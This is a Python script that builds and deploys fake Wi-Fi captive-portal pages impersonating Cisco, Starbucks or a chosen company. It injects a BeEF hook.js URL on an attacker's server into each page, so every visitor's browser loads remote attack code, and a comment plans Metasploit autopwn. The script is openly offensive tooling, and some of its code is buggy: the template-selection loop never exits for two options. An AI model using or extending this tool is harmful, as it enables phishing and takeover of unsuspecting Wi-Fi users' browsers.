#!/usr/bin/env python3
import fileinput
import re, os, sys, paramiko, random, getpass
from distutils.util import strtobool
from pyfiglet import Figlet
from __builtin__ import raw_input
from shutil import copytree
import SSHTransfer

##############################################################
#
#                      Splash Intro
#
##############################################################

f = Figlet(font='starwars')
print f.renderText('PORTAL-BUILDER & DEPLOY')
print('\n\n\nwritten by Dylan Stout\n\n')
print('Portal-Builder & Deploy is a script that creates HTML template portal landing pages.')
print('Allows for beef hook url insertion and paths to custom company logo images [*.png](recommended image resolution of 250x100px) ')
print('** TODO ** add a metasploit url insertion for autopwn.')
print('\n')

##############################################################
#
#                        Globals
#
##############################################################

dir = os.path.dirname(os.path.abspath(__file__))
inputIndexFile = os.path.join(dir, 'SecurEdge','index.html')
portalId = str(random.randint(0,66666))

##############################################################
#
#             Helper classes & methods
#
##############################################################

def multiple_replace(dict, text):
  # Create a regular expression  from the dictionary keys
  regex = re.compile("(%s)" % "|".join(map(re.escape, dict.keys())))
  # For each match, look-up corresponding value in dictionary
  return regex.sub(lambda mo: dict[mo.string[mo.start():mo.end()]], text)


# returns boolean for yes or no question prompt 
def user_yes_no_query(question):
    sys.stdout.write('%s [y/n]\n' % question)
    while True:
        try:
            return strtobool(raw_input().lower())
        except ValueError:
            sys.stdout.write('Please respond with \'y\' or \'n\'.\n')

            
##############################################################
#
#            Gather user input variables
#
##############################################################

companyName = raw_input("Enter company name: ")
companyImage = raw_input("Enter URL to company image (Ex. http://imgur.com/fds9dfu.jpg) : ")
beefHookUrl = "http://" + raw_input("BeefHook Server IP / Hostname + Port (I.E. 192.168.1.2:3000): ") + "/hook.js"

########################
#   Choose Template
########################
    
notChosen = True   
custom = True
templateDir = ""
while(notChosen):
    template = raw_input("Choose from the following templates: \n1. Cisco(NoDogSplash)\n2. SecurEdge(NoDogSplash)\n3. Starbucks (NoDogSplash)\n4. Custom - NoDogSplash (w/$authtarget)\n")
    if template == '1':
        templateDir = dir + "/Cisco/"
        notChosen = False
        custom = False
    elif template == '2':
        templateDir = dir + "/SecurEdge/"
        notChosen == False
        custom = False
    elif template == '3':
        templateDir = dir + "/Starbucks/"
        notChosen == False
        custom = False
    elif template == '4':
        templateDir = dir + "/SecurEdge/"
        notChosen = False
    else:
        print("Invalid choice, please try again...\n ")
        
isUsingFtp = user_yes_no_query("Would you like to deploy using SFTP? ")
if isUsingFtp:
    sftpIp         = raw_input("SFTP IP Address / Hostname : ")
    sftpUser       = raw_input("SFTP Username : ")
    sftpPassword   = getpass.getpass("SFTP Password : ")
    sftpDirectory  = raw_input("SFTP Remote Directory : ")
isSaving = user_yes_no_query("Would you like to save portal to local disk? ")
if isSaving:
    isDefaultLocation = user_yes_no_query("Save to default directory?")
    if isDefaultLocation:
        outputDir = (dir + '/Portal' + portalId)
    else:
        outputDir = raw_input("Enter local directory to save files into Ex. /Users/${user}/Documents: ") 
        
 
##############################################################
#
#                      Main methods
#
##############################################################

print "Building custom portal..."

replacementDict = dict()
replacementDict.update({'SecurEdge':companyName , 'secureEdgeLogo.png':companyImage , 'http://127.0.0.1:3000/hook.js':beefHookUrl})

if isUsingFtp:
    tmpDir= dir + "/transfer/Portal" + portalId
    copytree(templateDir,tmpDir)
    if custom:
        outTempFile = open(tmpDir + "/index.html", "w+")
        # Read in file as read only and replace dictionary items 
        # then write out to file 
        with open(inputIndexFile,  mode='r', buffering=-1) as f:
            for line in f:
                replacedLine = multiple_replace(replacementDict,line)
                outTempFile.write(replacedLine)
    SSHTransfer.upload_sftp(sftpUser, sftpPassword, sftpIp, tmpDir, sftpDirectory)
    print("\n####################################\nDeploy completed.\nPortal files uploaded to: " + sftpDirectory)
   
if isSaving:
    copytree(templateDir, outputDir)
    if custom:
        outFile = open(outputDir+ "/index.html", "w+")
        # Read in file as read only and replace dictionary items 
        # then write out to file 
        with open(inputIndexFile,  mode='r', buffering=-1) as f:
            for line in f:
                replacedLine = multiple_replace(replacementDict,line)
                outFile.write(replacedLine)
    print " \n\tPortal saved to disk at: " + outputDir

print "\nPortal-builder complete! \nExiting..." 

    


